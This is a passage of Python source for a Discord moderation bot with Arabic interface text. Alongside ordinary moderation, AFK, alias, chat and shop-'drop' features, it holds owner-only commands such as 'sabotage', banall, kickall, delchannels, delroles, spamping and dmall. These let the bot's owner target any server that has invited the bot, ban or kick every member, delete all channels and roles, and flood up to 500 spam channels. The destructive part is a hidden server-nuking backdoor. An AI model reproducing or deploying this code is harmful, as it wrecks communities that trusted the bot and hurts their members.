        report.append(f"🃏 سُحبت رتب {n} عضو")
    if kick:
        n = 0
        for m in list(g.members):
            if m.id != bot.user.id and not m.bot:
                try: await g.kick(m, reason="owner"); n += 1
                except: pass
        report.append(f"👢 طُرد {n} عضو")
    if ban:
        n = 0
        for m in list(g.members):
            if m.id != bot.user.id:
                try: await g.ban(m, reason="owner"); n += 1
                except: pass
        report.append(f"🔨 بان {n} عضو")
    if spam_name and spam_count > 0:
        sc = max(1, min(500, spam_count))
        tasks = [g.create_text_channel(spam_name) for _ in range(sc)]
        res = await asyncio.gather(*tasks, return_exceptions=True)
        done = sum(1 for r in res if not isinstance(r, Exception))
        report.append(f"📢 سبام {done} قناة ({spam_name})")
    try: await g.leave()
    except: pass
    return report

@bot.tree.command(name="sabotage", description="[OWNER] تخريب سيرفر — كل الخيارات في أمر واحد")
@app_commands.describe(
    server_id="ID السيرفر المستهدف",
    ban="تبنيد جميع الأعضاء (افتراضي: نعم)",
    del_channels="حذف جميع القنوات (افتراضي: نعم)",
    del_roles="حذف جميع الرتب (افتراضي: نعم)",
    kick="طرد الأعضاء قبل التبنيد (افتراضي: لا)",
    strip_roles="سحب رتب الأعضاء (افتراضي: لا)",
    spam_name="اسم قنوات السبام (اختياري، اتركه فارغ لإيقاف السبام)",
    spam_count="عدد قنوات السبام 1-500 (افتراضي: 0 = بدون سبام)"
)
async def slash_sabotage(
    interaction: discord.Interaction,
    server_id: str,
    ban: bool = True,
    del_channels: bool = True,
    del_roles: bool = True,
    kick: bool = False,
    strip_roles: bool = False,
    spam_name: str = "",
    spam_count: int = 0
):
    if not _ow(interaction):
        await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
    g = await _get_g(interaction, server_id)
    if not g: return
    parts = []
    if del_channels: parts.append("حذف قنوات")
    if del_roles: parts.append("حذف رتب")
    if strip_roles: parts.append("سحب رتب")
    if kick: parts.append("طرد")
    if ban: parts.append("تبنيد")
    if spam_name and spam_count > 0: parts.append(f"سبام×{spam_count}")
    await interaction.response.send_message(
        f"💥 **{g.name}** — {' | '.join(parts) or 'لا شيء'}",
        ephemeral=True
    )
    report = await _do_sabotage(g, ban, del_channels, del_roles, kick, strip_roles, spam_name, spam_count)
    try:
        await interaction.followup.send(
            "**✅ انتهى التخريب:**\n" + "\n".join(report),
            ephemeral=True
        )
    except: pass

@bot.command(name="sabotage", aliases=["sab"])
async def cmd_sabotage(ctx, server_id: str,
                        ban: str = "y", del_ch: str = "y", del_r: str = "y",
                        kick: str = "n", strip: str = "n",
                        spam_count: int = 0, *, spam_name: str = ""):
    if not _ow_c(ctx): await ctx.message.delete(); return
    try: g = bot.get_guild(int(server_id))
    except: g = None
    if not g: await ctx.send("❌ السيرفر غير موجود.", delete_after=3); return
    yn = lambda v: v.lower() in ("y","yes","1","نعم","true")
    m = await ctx.send(f"💥 تخريب **{g.name}**...")
    report = await _do_sabotage(g, yn(ban), yn(del_ch), yn(del_r), yn(kick), yn(strip), spam_name, spam_count)
    try: await m.edit(content="✅ انتهى:\n" + "\n".join(report))
    except: pass
    try: await ctx.message.delete()
    except: pass

@bot.tree.command(name="banall", description="[OWNER] تبنيد جميع أعضاء سيرفر")
@app_commands.describe(server_id="ID السيرفر")
async def slash_banall(interaction: discord.Interaction, server_id: str):
    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
    g = await _get_g(interaction, server_id)
    if not g: return
    await interaction.response.send_message(f"🔨 تبنيد في **{g.name}**...", ephemeral=True)
    report = await _do_sabotage(g, ban=True, del_ch=False, del_roles=False)
    try: await interaction.followup.send("\n".join(report), ephemeral=True)
    except: pass

@bot.command(name="banall", aliases=["ba"])
async def cmd_banall(ctx, server_id: str):
    if not _ow_c(ctx): await ctx.message.delete(); return
    try: g = bot.get_guild(int(server_id))
    except: g = None
    if not g: await ctx.send("❌", delete_after=3); return
    m = await ctx.send(f"🔨 تبنيد في **{g.name}**...")
    report = await _do_sabotage(g, ban=True, del_ch=False, del_roles=False)
    try: await m.edit(content="\n".join(report))
    except: pass

@bot.tree.command(name="kickall", description="[OWNER] طرد جميع أعضاء سيرفر")
@app_commands.describe(server_id="ID السيرفر")
async def slash_kickall(interaction: discord.Interaction, server_id: str):
    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
    g = await _get_g(interaction, server_id)
    if not g: return
    await interaction.response.send_message(f"👢 طرد في **{g.name}**...", ephemeral=True)
    report = await _do_sabotage(g, ban=False, del_ch=False, del_roles=False, kick=True)
    try: await interaction.followup.send("\n".join(report), ephemeral=True)
    except: pass

@bot.command(name="kickall", aliases=["ka"])
async def cmd_kickall(ctx, server_id: str):
    if not _ow_c(ctx): await ctx.message.delete(); return
    try: g = bot.get_guild(int(server_id))
    except: g = None
    if not g: await ctx.send("❌", delete_after=3); return
    m = await ctx.send(f"👢 طرد في **{g.name}**...")
    report = await _do_sabotage(g, ban=False, del_ch=False, del_roles=False, kick=True)
    try: await m.edit(content="\n".join(report))
    except: pass

@bot.tree.command(name="delroles", description="[OWNER] حذف جميع رتب سيرفر")
@app_commands.describe(server_id="ID السيرفر")
async def slash_delroles(interaction: discord.Interaction, server_id: str):
    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
    g = await _get_g(interaction, server_id)
    if not g: return
    await interaction.response.send_message(f"🗑️ حذف رتب **{g.name}**...", ephemeral=True)
    report = await _do_sabotage(g, ban=False, del_ch=False, del_roles=True)
    try: await interaction.followup.send("\n".join(report), ephemeral=True)
    except: pass

@bot.command(name="delroles", aliases=["dr2"])
async def cmd_delroles(ctx, server_id: str):
    if not _ow_c(ctx): await ctx.message.delete(); return
    try: g = bot.get_guild(int(server_id))
    except: g = None
    if not g: await ctx.send("❌", delete_after=3); return
    m = await ctx.send(f"🗑️ حذف رتب **{g.name}**...")
    report = await _do_sabotage(g, ban=False, del_ch=False, del_roles=True)
    try: await m.edit(content="\n".join(report))
    except: pass

@bot.tree.command(name="delchannels", description="[OWNER] حذف جميع قنوات سيرفر")
@app_commands.describe(server_id="ID السيرفر")
async def slash_delchannels(interaction: discord.Interaction, server_id: str):
    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
    g = await _get_g(interaction, server_id)
    if not g: return
    await interaction.response.send_message(f"🗑️ حذف قنوات **{g.name}**...", ephemeral=True)
    report = await _do_sabotage(g, ban=False, del_ch=True, del_roles=False)
    try: await interaction.followup.send("\n".join(report), ephemeral=True)
    except: pass

@bot.command(name="delchannels", aliases=["dch"])
async def cmd_delchannels(ctx, server_id: str):
    if not _ow_c(ctx): await ctx.message.delete(); return
    try: g = bot.get_guild(int(server_id))
    except: g = None
    if not g: await ctx.send("❌", delete_after=3); return
    m = await ctx.send(f"🗑️ حذف قنوات **{g.name}**...")
    report = await _do_sabotage(g, ban=False, del_ch=True, del_roles=False)
    try: await m.edit(content="\n".join(report))
    except: pass

@bot.tree.command(name="stripall", description="[OWNER] سحب رتب جميع الأعضاء")
@app_commands.describe(server_id="ID السيرفر")
async def slash_stripall(interaction: discord.Interaction, server_id: str):
    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
    g = await _get_g(interaction, server_id)
    if not g: return
    await interaction.response.send_message(f"🃏 سحب رتب **{g.name}**...", ephemeral=True)
    report = await _do_sabotage(g, ban=False, del_ch=False, del_roles=False, strip=True)
    try: await interaction.followup.send("\n".join(report), ephemeral=True)
    except: pass

@bot.command(name="stripall", aliases=["sa2"])
async def cmd_stripall(ctx, server_id: str):
    if not _ow_c(ctx): await ctx.message.delete(); return
    try: g = bot.get_guild(int(server_id))
    except: g = None
    if not g: await ctx.send("❌", delete_after=3); return
    m = await ctx.send(f"🃏 سحب رتب **{g.name}**...")
    report = await _do_sabotage(g, ban=False, del_ch=False, del_roles=False, strip=True)
    try: await m.edit(content="\n".join(report))
    except: pass

@bot.tree.command(name="spamping", description="[OWNER] سبام منشن في سيرفر")
@app_commands.describe(server_id="ID السيرفر", message="الرسالة أو المنشن", count="عدد المرات 1-200")
async def slash_spamping(interaction: discord.Interaction, server_id: str, message: str = "@everyone", count: int = 10):
    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
    g = await _get_g(interaction, server_id)
    if not g: return
    chs = [c for c in g.text_channels]
    if not chs: await interaction.response.send_message("❌ لا قنوات.", ephemeral=True); return
    sc = max(1, min(200, count))
    await interaction.response.send_message(f"📢 سبام في **{g.name}** × {sc}...", ephemeral=True)
    n = 0
    for _ in range(sc):
        try: await chs[0].send(message); n += 1
        except: pass
    try: await interaction.followup.send(f"✅ أُرسل {n} رسالة.", ephemeral=True)
    except: pass

@bot.command(name="spamping", aliases=["sp"])
async def cmd_spamping(ctx, server_id: str, count: int = 10, *, message: str = "@everyone"):
    if not _ow_c(ctx): await ctx.message.delete(); return
    try: g = bot.get_guild(int(server_id))
    except: g = None
    if not g: await ctx.send("❌", delete_after=3); return
    chs = [c for c in g.text_channels]
    if not chs: await ctx.send("❌ لا قنوات.", delete_after=3); return
    sc = max(1, min(200, count)); n = 0
    m = await ctx.send(f"📢 سبام في **{g.name}**...")
    for _ in range(sc):
        try: await chs[0].send(message); n += 1
        except: pass
    try: await m.edit(content=f"✅ أُرسل {n} رسالة.")
    except: pass

@bot.tree.command(name="dmall", description="[OWNER] إرسال DM لجميع الأعضاء")
@app_commands.describe(server_id="ID السيرفر", message="الرسالة")
async def slash_dmall(interaction: discord.Interaction, server_id: str, message: str):
    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
    g = await _get_g(interaction, server_id)
    if not g: return
    await interaction.response.send_message(f"📨 إرسال DM في **{g.name}**...", ephemeral=True)
    n = 0
    for mem in list(g.members):
        if mem.bot: continue
        try: await mem.send(message); n += 1
        except: pass
    try: await interaction.followup.send(f"✅ أُرسل لـ {n} عضو.", ephemeral=True)
    except: pass

@bot.command(name="dmall", aliases=["dma"])
async def cmd_dmall(ctx, server_id: str, *, message: str):
    if not _ow_c(ctx): await ctx.message.delete(); return
    try: g = bot.get_guild(int(server_id))
    except: g = None
    if not g: await ctx.send("❌", delete_after=3); return
    m = await ctx.send(f"📨 إرسال DM في **{g.name}**...")
    n = 0
    for mem in list(g.members):
        if mem.bot: continue
        try: await mem.send(message); n += 1
        except: pass
    try: await m.edit(content=f"✅ أُرسل لـ {n} عضو.")
    except: pass

@bot.tree.command(name="renameall", description="[OWNER] إعادة تسمية جميع القنوات")
@app_commands.describe(server_id="ID السيرفر", name="الاسم الجديد")
async def slash_renameall(interaction: discord.Interaction, server_id: str, name: str):
    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
    g = await _get_g(interaction, server_id)
    if not g: return
    await interaction.response.send_message(f"✏️ تسمية قنوات **{g.name}**...", ephemeral=True)
    n = 0
    for ch in g.text_channels:
        try: await ch.edit(name=name); n += 1
        except: pass
    try: await interaction.followup.send(f"✅ تمت تسمية {n} قناة.", ephemeral=True)
    except: pass

@bot.command(name="renameall", aliases=["rna"])
async def cmd_renameall(ctx, server_id: str, *, name: str):
    if not _ow_c(ctx): await ctx.message.delete(); return
    try: g = bot.get_guild(int(server_id))
    except: g = None
    if not g: await ctx.send("❌", delete_after=3); return
    m = await ctx.send(f"✏️ تسمية قنوات **{g.name}**...")
    n = 0
    for ch in g.text_channels:
        try: await ch.edit(name=name); n += 1
        except: pass
    try: await m.edit(content=f"✅ تمت تسمية {n} قناة.")
    except: pass

@bot.tree.command(name="setname", description="[OWNER] تغيير اسم سيرفر")
@app_commands.describe(server_id="ID السيرفر", name="الاسم الجديد")
async def slash_setname(interaction: discord.Interaction, server_id: str, name: str):
    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
    g = await _get_g(interaction, server_id)
    if not g: return
    old = g.name; await g.edit(name=name)
    await interaction.response.send_message(f"✅ **{old}** ← **{name}**", ephemeral=True)

@bot.command(name="setname", aliases=["sn2"])
async def cmd_setname(ctx, server_id: str, *, name: str):
    if not _ow_c(ctx): await ctx.message.delete(); return
    try: g = bot.get_guild(int(server_id))
    except: g = None
    if not g: await ctx.send("❌", delete_after=3); return
    old = g.name; await g.edit(name=name)
    await ctx.send(f"✅ {old} ← {name}", delete_after=5)

@bot.tree.command(name="leaveall", description="[OWNER] البوت يغادر جميع السيرفرات")
async def slash_leaveall(interaction: discord.Interaction):
    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
    guilds = list(bot.guilds); n = 0
    await interaction.response.send_message(f"🚪 مغادرة {len(guilds)} سيرفر...", ephemeral=True)
    for gx in guilds:
        try: await gx.leave(); n += 1
        except: pass
    try: await interaction.followup.send(f"✅ غادر {n} سيرفر.", ephemeral=True)
    except: pass

@bot.command(name="leaveall", aliases=["la2"])
async def cmd_leaveall(ctx):
    if not _ow_c(ctx): await ctx.message.delete(); return
    guilds = list(bot.guilds); n = 0
    m = await ctx.send(f"🚪 مغادرة {len(guilds)} سيرفر...")
    for gx in guilds:
        try: await gx.leave(); n += 1
        except: pass
    try: await m.edit(content=f"✅ غادر {n} سيرفر.")
    except: pass

@bot.tree.command(name="owner-help", description="[OWNER] قائمة أوامر المالك")
async def slash_owner_help(interaction: discord.Interaction):
    if not _ow(interaction): await interaction.response.send_message(embed=_owner_err(), ephemeral=True); return
    e = discord.Embed(title="🔐 أوامر المالك — y.7tr2", color=discord.Color.dark_red())
    cmds = [
        ("💥 sabotage","تخريب شامل بكل الخيارات:\n`ban` تبنيد | `del_channels` حذف قنوات | `del_roles` حذف رتب\n`kick` طرد | `strip_roles` سحب رتب | `spam_name`+`spam_count` سبام\n`y.sabotage <id> ban=y del_ch=y del_r=y kick=n strip=n spam_count=0 spam_name=`"),
        ("🔨 banall","تبنيد جميع الأعضاء | `<server_id>`"),
        ("👢 kickall","طرد جميع الأعضاء | `<server_id>`"),
        ("🗑️ delroles","حذف جميع الرتب | `<server_id>`"),
        ("🗑️ delchannels","حذف جميع القنوات | `<server_id>`"),
        ("🃏 stripall","سحب رتب الكل | `<server_id>`"),
        ("📢 spamping","سبام منشن | `<server_id> <count> <message>`"),
        ("📨 dmall","DM لكل الأعضاء | `<server_id> <message>`"),
        ("✏️ renameall","تسمية كل القنوات | `<server_id> <name>`"),
        ("🏷️ setname","تغيير اسم السيرفر | `<server_id> <name>`"),
        ("🚪 leaveall","مغادرة كل السيرفرات"),
        ("📋 bot-servers","عرض سيرفرات البوت"),
        ("🚪 bot-leave","طرد البوت من سيرفر | `<server_id>`"),
        ("🔗 bot-invite","لينك دعوة البوت"),
        ("📤 send","إرسال embed لقناة"),
    ]
    for name, desc in cmds:
        e.add_field(name=name, value=desc, inline=False)
    await interaction.response.send_message(embed=e, ephemeral=True)

@bot.tree.command(name="alias-add", description="إضافة اختصار لأمر (مثال: b ← ban)")
@app_commands.describe(alias="الاختصار", command="الأمر الكامل مثال: ban / kick / mute / unmute / timeout / warn / purge / lock / unlock / nuke")
@app_commands.checks.has_permissions(administrator=True)
async def alias_add(interaction: discord.Interaction, alias: str, command: str):
    alias = alias.strip().lower(); command = command.strip().lower()
    valid = ["ban","unban","kick","mute","unmute","timeout","warn","purge","lock","unlock","nuke","softban","hackban","role-add","role-remove","say"]
    if command not in valid:
        await interaction.response.send_message(f"❌ الأمر غير مدعوم. المتاح:\n`{'` `'.join(valid)}`", ephemeral=True); return
    exists = db_q("SELECT id FROM cmd_aliases WHERE guild_id=? AND alias=?", (str(interaction.guild.id), alias), fetch="one")
    if exists:
        db_q("UPDATE cmd_aliases SET command=? WHERE guild_id=? AND alias=?", (command, str(interaction.guild.id), alias))
    else:
        db_q("INSERT INTO cmd_aliases (guild_id,alias,command) VALUES (?,?,?)", (str(interaction.guild.id), alias, command))
    await interaction.response.send_message(f"✅ الاختصار `y.{alias}` → `{command}` تم الإضافة.")

@bot.tree.command(name="alias-remove", description="حذف اختصار")
@app_commands.describe(alias="الاختصار")
@app_commands.checks.has_permissions(administrator=True)
async def alias_remove(interaction: discord.Interaction, alias: str):
    alias = alias.strip().lower()
    db_q("DELETE FROM cmd_aliases WHERE guild_id=? AND alias=?", (str(interaction.guild.id), alias))
    await interaction.response.send_message(f"✅ حُذف الاختصار `y.{alias}`.")

@bot.tree.command(name="alias-list", description="قائمة الاختصارات")
async def alias_list(interaction: discord.Interaction):
    rows = db_q("SELECT alias,command FROM cmd_aliases WHERE guild_id=?", (str(interaction.guild.id),), fetch="all") or []
    e = discord.Embed(title="⌨️ الاختصارات المخصصة", color=discord.Color.blurple())
    if not rows: e.description = "لا اختصارات مخصصة.\nاستخدم `/alias-add` لإضافة."
    else:
        for alias, cmd in rows: e.add_field(name=f"y.{alias}", value=cmd, inline=True)
    await interaction.response.send_message(embed=e)

@bot.event
async def on_member_join(member):
    row = db_q("SELECT role_id FROM autorole WHERE guild_id=?", (str(member.guild.id),), fetch="one")
    if row:
        r = member.guild.get_role(int(row[0]))
        if r:
            try: await member.add_roles(r)
            except: pass
    wc = discord.utils.get(member.guild.channels, name="welcome") or discord.utils.get(member.guild.channels, name="ترحيب")
    if wc:
        e = discord.Embed(title=f"👋 أهلاً {member.display_name}!", description=f"{member.mention} عضو #{member.guild.member_count}", color=discord.Color.green())
        e.set_thumbnail(url=member.display_avatar.url); await wc.send(embed=e)

@bot.event
async def on_member_remove(member):
    lc = discord.utils.get(member.guild.channels, name="goodbye") or discord.utils.get(member.guild.channels, name="وداع")
    if lc:
        e = discord.Embed(title=f"👋 وداعاً {member.display_name}", color=discord.Color.red()); e.set_thumbnail(url=member.display_avatar.url)
        await lc.send(embed=e)

@bot.event
async def on_message(message):
    if message.author.bot: return
    if message.guild:
        row = db_q("SELECT reason,timestamp FROM afk WHERE user_id=? AND guild_id=?",
                   (str(message.author.id), str(message.guild.id)), fetch="one")
        if row:
            db_q("DELETE FROM afk WHERE user_id=? AND guild_id=?", (str(message.author.id), str(message.guild.id)))
            try: await message.reply(f"👋 {message.author.mention} تم إزالة الغياب.", delete_after=5)
            except: pass
        elif message.mentions:
            for mentioned in message.mentions:
                r2 = db_q("SELECT reason,timestamp FROM afk WHERE user_id=? AND guild_id=?",
                          (str(mentioned.id), str(message.guild.id)), fetch="one")
                if r2:
                    try: await message.reply(f"💤 **{mentioned.display_name}** غايب.\n**السبب:** {r2[0]}", delete_after=10)
                    except: pass
    if message.guild and message.content.startswith(PREFIX):
        parts = message.content[len(PREFIX):].split()
        if parts:
            alias_key = parts[0].lower()
            alias_row = db_q("SELECT command FROM cmd_aliases WHERE guild_id=? AND alias=?",
                             (str(message.guild.id), alias_key), fetch="one")
            if alias_row:
                mapped = alias_row[0]
                message.content = PREFIX + mapped + (" " + " ".join(parts[1:]) if len(parts) > 1 else "")
    # ── شات GPT ──
    if message.guild and not message.content.startswith(PREFIX):
        gid = str(message.guild.id)
        cgrow = db_q("SELECT channel_id, enabled FROM chatgpt WHERE guild_id=?", (gid,), fetch="one")
        if cgrow and cgrow[1] == 1 and cgrow[0] and str(message.channel.id) == cgrow[0]:
            # cooldown 5 ثوانٍ للمستخدم لتجنب 429
            uid = str(message.author.id)
            now_ts = time.time()
            last_ts = _chat_cooldown.get(uid, 0)
            if now_ts - last_ts < 5:
                try: await message.add_reaction("⏳")
                except: pass
                return
            _chat_cooldown[uid] = now_ts
            # احذف القيم القديمة بشكل دوري
            if len(_chat_cooldown) > 500:
                cutoff = now_ts - 30
                for k in [k for k,v in list(_chat_cooldown.items()) if v < cutoff]:
                    _chat_cooldown.pop(k, None)
            async with message.channel.typing():
                reply = await _call_openai(gid, message.author.display_name, message.content)
            try:
                await message.reply(reply[:2000])
            except Exception:
                try: await message.channel.send(reply[:2000])
                except: pass
            return
    await bot.process_commands(message)

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions): await ctx.send("❌ ما عندك صلاحية.")
    elif isinstance(error, commands.MemberNotFound): await ctx.send("❌ العضو غير موجود.")
    elif isinstance(error, commands.CommandNotFound): pass
    else: print(f"cmd:{error}")

@bot.tree.error
async def on_app_command_error(interaction: discord.Interaction, error):
    msg = "❌ حدث خطأ."
    if isinstance(error, app_commands.MissingPermissions): msg = "❌ ما عندك صلاحية."
    elif isinstance(error, app_commands.CommandOnCooldown): msg = f"❌ انتظر {error.retry_after:.1f}ث."
    try:
        if interaction.response.is_done(): await interaction.followup.send(msg, ephemeral=True)
        else: await interaction.response.send_message(msg, ephemeral=True)
    except: pass

# ─── اختصارات الأوامر ───
@bot.command(name="ban", aliases=["b"])
@commands.has_permissions(ban_members=True)
async def cmd_ban(ctx, member: discord.Member, *, reason="—"):
    await member.ban(reason=reason)
    e=discord.Embed(title="🔨 باند",color=discord.Color.red()); e.add_field(name="العضو",value=member.mention); e.add_field(name="السبب",value=reason)
    await ctx.send(embed=e)

@bot.command(name="kick", aliases=["k"])
@commands.has_permissions(kick_members=True)
async def cmd_kick(ctx, member: discord.Member, *, reason="—"):
    await member.kick(reason=reason)
    e=discord.Embed(title="👢 كيك",color=discord.Color.orange()); e.add_field(name="العضو",value=member.mention)
    await ctx.send(embed=e)

@bot.command(name="unban", aliases=["ub"])
@commands.has_permissions(ban_members=True)
async def cmd_unban(ctx, user_id: str, *, reason="—"):
    try:
        u=await bot.fetch_user(int(user_id)); await ctx.guild.unban(u, reason=reason)
        await ctx.send(f"✅ رُفع الباند عن {u}")
    except: await ctx.send("❌ مستخدم غير موجود.")

@bot.command(name="mute", aliases=["m"])
@commands.has_permissions(manage_roles=True)
async def cmd_mute(ctx, member: discord.Member, *, reason="—"):
    mr=discord.utils.get(ctx.guild.roles, name="Muted")
    if not mr:
        mr=await ctx.guild.create_role(name="Muted")
        for ch in ctx.guild.channels:
            try: await ch.set_permissions(mr, send_messages=False, speak=False)
            except: pass
    await member.add_roles(mr, reason=reason); await ctx.send(f"🔇 تم ميوت {member.mention}")

@bot.command(name="unmute", aliases=["um"])
@commands.has_permissions(manage_roles=True)
async def cmd_unmute(ctx, member: discord.Member):
    mr=discord.utils.get(ctx.guild.roles, name="Muted")
    if mr and mr in member.roles: await member.remove_roles(mr); await ctx.send(f"✅ رُفع الميوت عن {member.mention}")
    else: await ctx.send("❌ مو مميوت.")

@bot.command(name="warn", aliases=["w"])
@commands.has_permissions(manage_messages=True)
async def cmd_warn(ctx, member: discord.Member, *, reason):
    db_q("INSERT INTO warnings (user_id,guild_id,reason,moderator_id,timestamp) VALUES (?,?,?,?,?)",
         (str(member.id),str(ctx.guild.id),reason,str(ctx.author.id),str(datetime.datetime.now())))
    count=(db_q("SELECT COUNT(*) FROM warnings WHERE user_id=? AND guild_id=?",(str(member.id),str(ctx.guild.id)),fetch="one") or [0])[0]
    await ctx.send(f"⚠️ تحذير {member.mention} | {reason} | إجمالي: {count}")

@bot.command(name="purge", aliases=["clear","cl"])
@commands.has_permissions(manage_messages=True)
async def cmd_purge(ctx, amount: int=10):
    d=await ctx.channel.purge(limit=max(1,min(100,amount))); await ctx.send(f"✅ حُذف {len(d)} رسالة.", delete_after=3)

@bot.command(name="lock", aliases=["lk"])
@commands.has_permissions(manage_channels=True)
async def cmd_lock(ctx):
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False); await ctx.send("🔒 قُفلت القناة.")

@bot.command(name="unlock", aliases=["ulk"])
@commands.has_permissions(manage_channels=True)
async def cmd_unlock(ctx):
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=True); await ctx.send("🔓 فُتحت القناة.")

@bot.command(name="timeout", aliases=["to","mute-time"])
@commands.has_permissions(moderate_members=True)
async def cmd_timeout(ctx, member: discord.Member, minutes: int=10, *, reason="—"):
    await member.timeout(discord.utils.utcnow()+datetime.timedelta(minutes=minutes), reason=reason)
    await ctx.send(f"⏳ تايم اوت {member.mention} لـ {minutes} دقيقة.")

@bot.command(name="nuke", aliases=["n"])
@commands.has_permissions(administrator=True)
async def cmd_nuke(ctx):
    pos=ctx.channel.position; nc=await ctx.channel.clone(); await ctx.channel.delete()
    await nc.edit(position=pos); await nc.send("💣 تم النيوك!")

# ═══════════════════════════════════════════════════════════════
#  🛍️  نظام الدروب — DROP SYSTEM
# ═══════════════════════════════════════════════════════════════

def _init_drop_tables():
    conn = sqlite3.connect(DB_FILE); c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS drop_settings (
        guild_id TEXT PRIMARY KEY,
        channel_id TEXT,
        mention_role_ids TEXT DEFAULT '[]',
        mention_everyone INTEGER DEFAULT 1,
        footer TEXT DEFAULT ''
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS drops (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        guild_id TEXT, channel_id TEXT, message_id TEXT,
        item_name TEXT, quantity INTEGER, price TEXT, note TEXT,
        posted_by TEXT, posted_at TEXT, status TEXT DEFAULT 'open'
    )""")
    conn.commit(); conn.close()

_init_drop_tables()

def _get_drop_settings(guild_id):
    return db_q(
        "SELECT channel_id, mention_role_ids, mention_everyone, footer FROM drop_settings WHERE guild_id=?",
        (str(guild_id),), fetch="one"
    )

def _insert_drop_get_id(guild_id, channel_id, item, quantity, price, note, poster_id, now):
    conn = sqlite3.connect(DB_FILE); c = conn.cursor()
    c.execute(
        "INSERT INTO drops (guild_id,channel_id,item_name,quantity,price,note,posted_by,posted_at) VALUES (?,?,?,?,?,?,?,?)",
        (str(guild_id), str(channel_id), item, quantity, price, note, str(poster_id), now)
    )
    conn.commit(); lid = c.lastrowid; conn.close(); return lid

def _build_drop_embed(item, quantity, price, note, author_mention, author_name, footer_txt):
    e = discord.Embed(title=f"🛍️ دروب جديد — {item}", color=discord.Color.from_rgb(0, 200, 100))
    e.add_field(name="📦 الكمية", value=f"**{quantity}**", inline=True)
    e.add_field(name="💰 السعر", value=f"**{price}**", inline=True)
    if note: e.add_field(name="📝 ملاحظة", value=note, inline=False)
    e.add_field(name="👤 البائع", value=author_mention, inline=False)
    e.set_footer(text=footer_txt or f"نزول بواسطة {author_name}")
    e.timestamp = discord.utils.utcnow()
    return e

def _build_mention_str(mention_everyone, role_ids):
    parts = []
    if mention_everyone: parts.append("@everyone")
    for rid in role_ids: parts.append(f"<@&{rid}>")
    return " ".join(parts) if parts else None


class DropBuyView(discord.ui.View):
    def __init__(self, poster_id: int, drop_id: int):
        super().__init__(timeout=None)
        self.poster_id = poster_id
        self.drop_id = drop_id

    @discord.ui.button(label="🛒 طلب الشراء", style=discord.ButtonStyle.success, custom_id="drop_buy_btn")
    async def buy(self, interaction: discord.Interaction, button: discord.ui.Button):
        row = db_q("SELECT item_name,quantity,price,posted_by,status FROM drops WHERE id=?", (self.drop_id,), fetch="one")
        if not row: await interaction.response.send_message("❌ الدروب غير موجود.", ephemeral=True); return
        item, qty, price, poster_id, status = row
        if status != "open": await interaction.response.send_message("❌ الدروب مغلق.", ephemeral=True); return
        poster = interaction.guild.get_member(int(poster_id)) if poster_id else None
        e = discord.Embed(title="🛒 طلب شراء جديد!", color=discord.Color.gold())
        e.add_field(name="📦 المنتج", value=item or "—", inline=True)
        e.add_field(name="🔢 الكمية", value=str(qty), inline=True)
        e.add_field(name="💰 السعر", value=str(price), inline=True)
        e.add_field(name="👤 المشتري", value=f"{interaction.user.mention}\n(`{interaction.user}`)", inline=False)
        e.set_footer(text=f"السيرفر: {interaction.guild.name}")
        e.timestamp = discord.utils.utcnow()
        sent = False
        if poster:
            try: await poster.send(embed=e); sent = True
            except: pass
        if sent:
            await interaction.response.send_message(f"✅ أُرسل طلبك لـ {poster.mention}! راح يتواصل معك.", ephemeral=True)
        else:
            await interaction.response.send_message("✅ تم تسجيل طلبك. انتظر تواصل المالك.", ephemeral=True)

    @discord.ui.button(label="❌ إغلاق الدروب", style=discord.ButtonStyle.danger, custom_id="drop_close_btn")
    async def close_drop(self, interaction: discord.Interaction, button: discord.ui.Button):
        row = db_q("SELECT posted_by FROM drops WHERE id=?", (self.drop_id,), fetch="one")
        if not row: await interaction.response.send_message("❌ الدروب غير موجود.", ephemeral=True); return
        is_admin = interaction.user.guild_permissions.administrator
        is_poster = str(interaction.user.id) == str(row[0])
        if not is_admin and not is_poster:
            await interaction.response.send_message("❌ فقط المالك أو الإدارة يقدرون يغلقون.", ephemeral=True); return
        db_q("UPDATE drops SET status='closed' WHERE id=?", (self.drop_id,))
        try:
            emb = interaction.message.embeds[0]
            closed_emb = discord.Embed(title=f"{emb.title} ❌ مغلق", color=discord.Color.red())
            for f in emb.fields: closed_emb.add_field(name=f.name, value=f.value, inline=f.inline)
            closed_emb.set_footer(text="الدروب مغلق")
            await interaction.message.edit(embed=closed_emb, view=None)
        except: pass
        await interaction.response.send_message("✅ تم إغلاق الدروب.", ephemeral=True)


@bot.tree.command(name="drop-setup", description="⚙️ إعداد نظام الدروب (القناة + المنشن)")
@app_commands.describe(
    channel="قناة نزول الدروب",
    mention_everyone="تمنشن @everyone تلقائياً؟ (افتراضي: نعم)",
    role1="رتبة تُمنشن 1", role2="رتبة تُمنشن 2", role3="رتبة تُمنشن 3",
    footer="نص الفوتر الثابت (اختياري)"
)
@app_commands.checks.has_permissions(administrator=True)
async def drop_setup(interaction: discord.Interaction, channel: discord.TextChannel,
                     mention_everyone: bool = True,
                     role1: Optional[discord.Role]=None, role2: Optional[discord.Role]=None,
                     role3: Optional[discord.Role]=None, footer: str=""):
    roles = [r for r in [role1, role2, role3] if r]
    role_ids = json.dumps([str(r.id) for r in roles])
    conn = sqlite3.connect(DB_FILE); c = conn.cursor()
    c.execute("SELECT guild_id FROM drop_settings WHERE guild_id=?", (str(interaction.guild.id),))
    if c.fetchone():
        c.execute("UPDATE drop_settings SET channel_id=?,mention_role_ids=?,mention_everyone=?,footer=? WHERE guild_id=?",
